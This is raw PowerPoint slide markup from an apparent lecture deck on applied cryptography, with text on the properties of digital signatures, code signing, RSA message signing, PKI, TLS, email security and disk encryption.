              <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:ln w="0">
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Brush Script MT"/>
              </a:rPr>
              <a:t>Signature</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
              <a:ln w="0">
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="933" name="Line 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5560920" y="4205160"/>
            <a:ext cx="838080" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd len="med" type="triangle" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="934" name="Line 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="6703920" y="4205160"/>
            <a:ext cx="228600" cy="1523880"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd len="med" type="triangle" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="935" name="Line 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="7008480" y="4205160"/>
            <a:ext cx="1295640" cy="1219320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:head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Properties</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="937" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="455760" y="1690560"/>
            <a:ext cx="8307000" cy="4252680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The signature is authentic and </a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2000"/>
            </a:br>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>not forgeable:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> The signature is </a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2000"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>proof that the signer, and no one </a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2000"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>else, signed the document.</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1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The signature is not reusable:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2000"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The signature is a part of the document and cannot be moved to a different document.</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1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The signature is unalterable:</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t> After a document is signed, it cannot be altered.</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1" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The signature cannot be repudiated</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>: For legal purposes, the signature and the document are considered to be physical things. The signer cannot claim later that they did not sign it.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="938" name="Group 15"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4903920" y="1371600"/>
            <a:ext cx="3934800" cy="1885680"/>
            <a:chOff x="4903920" y="1371600"/>
            <a:chExt cx="3934800" cy="1885680"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="939" name="Picture 14" descr="clear_message"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId1"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="7168320" y="1561320"/>
              <a:ext cx="1670400" cy="1695960"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="940" name="Rectangle 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="1125600">
              <a:off x="7584120" y="2826000"/>
              <a:ext cx="858240" cy="191520"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1"/>
            </a:solidFill>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="941" name="WordArt 16"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="1044000">
              <a:off x="7580160" y="2847600"/>
              <a:ext cx="839160" cy="164880"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="90000" bIns="90000" anchor="t" anchorCtr="1">
              <a:prstTxWarp prst="textPlain">
                <a:avLst>
                  <a:gd name="adj" fmla="val 50000"/>
                </a:avLst>
              </a:prstTxWarp>
              <a:noAutofit/>
            </a:bodyPr>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                  <a:ln w="0">
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Brush Script MT"/>
                </a:rPr>
                <a:t>Signature</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:ln w="0">
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="942" name="Line 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6881400" y="2225520"/>
              <a:ext cx="515880" cy="360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="943" name="Line 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6881400" y="2320200"/>
              <a:ext cx="515880" cy="360"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="944" name="Picture 25" descr="MCj04247920000[1]"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId2"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="4903920" y="1371600"/>
              <a:ext cx="2034720" cy="1834200"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="945" name="WordArt 26"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6078960" y="2415240"/>
              <a:ext cx="744840" cy="474120"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t" anchorCtr="1">
              <a:prstTxWarp prst="textPlain">
                <a:avLst>
                  <a:gd name="adj" fmla="val 50000"/>
                </a:avLst>
              </a:prstTxWarp>
              <a:noAutofit/>
            </a:bodyPr>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                  <a:ln w="0">
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Brush Script MT"/>
                </a:rPr>
                <a:t>Digital </a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:ln w="0">
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                  <a:ln w="0">
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Brush Script MT"/>
                </a:rPr>
                <a:t>Signature</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:ln w="0">
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="946" name="Rectangle 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="1125600">
              <a:off x="7571520" y="1905840"/>
              <a:ext cx="858240" cy="256680"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1"/>
            </a:solidFill>
            <a:ln w="0">
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:style>
            <a:lnRef idx="0"/>
            <a:fillRef idx="0"/>
            <a:effectRef idx="0"/>
            <a:fontRef idx="minor"/>
          </p:style>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="947" name="WordArt 16"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="1044000">
              <a:off x="7580160" y="1946160"/>
              <a:ext cx="839160" cy="164880"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="90000" bIns="90000" anchor="t" anchorCtr="1">
              <a:prstTxWarp prst="textPlain">
                <a:avLst>
                  <a:gd name="adj" fmla="val 50000"/>
                </a:avLst>
              </a:prstTxWarp>
              <a:noAutofit/>
            </a:bodyPr>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPct val="90000"/>
                </a:lnSpc>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                  <a:ln w="0">
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Brush Script MT"/>
                </a:rPr>
                <a:t>Memo</a:t>
              </a:r>
              <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                <a:ln w="0">
                  <a:noFill/>
                </a:ln>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Code Signing with Digital Signatures</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="949" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4648320"/>
            <a:ext cx="8224560" cy="1523520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr lvl="1" marL="507960" indent="-287280">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The publisher of the software attaches a digital signature to the executable, signed with the signature key of the publisher.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="507960" indent="-287280">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The user of the software needs to obtain the public key of the publisher or the CA certificate of the publisher if PKI is used.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="950" name="Picture 7" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2590920" y="1676520"/>
            <a:ext cx="3877200" cy="2828520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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1"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Signing Messages with RSA</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="952"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Ensures authenticity and integrity of messages</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="953" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="533520" y="2297880"/>
            <a:ext cx="7772040" cy="4178520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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 name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7772040" cy="1469520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Applying Cryptography</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="955" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="3581280"/>
            <a:ext cx="6400440" cy="1752120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:buNone/>
            </a:pP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Contents</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="957"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Public Key Infrastructure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sv-SE" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Secure Socket Layer (SSL) and Transport Layer Security (TLS)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sv-SE" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Email Security</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sv-SE" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Disk Encryption</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PKI Overview</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="959" name="Picture 6" descr="Woman"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2141640"/>
            <a:ext cx="914040" cy="3671640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="960" name="Picture 7" descr="Government"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6386400" y="1752480"/>
            <a:ext cx="1918800" cy="1531440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="961" name="Picture 8" descr="Small_Business"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="4457880"/>
            <a:ext cx="1523520" cy="1341000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="962" name="Line 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2361960" y="2217600"/>
            <a:ext cx="3810240" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd len="med" type="triangle" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="963" name="Line 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2300040" y="4732200"/>
            <a:ext cx="3810240" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd len="med" type="triangle" w="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="964" name="Line 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2286000" y="3132000"/>
            <a:ext cx="4481280" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
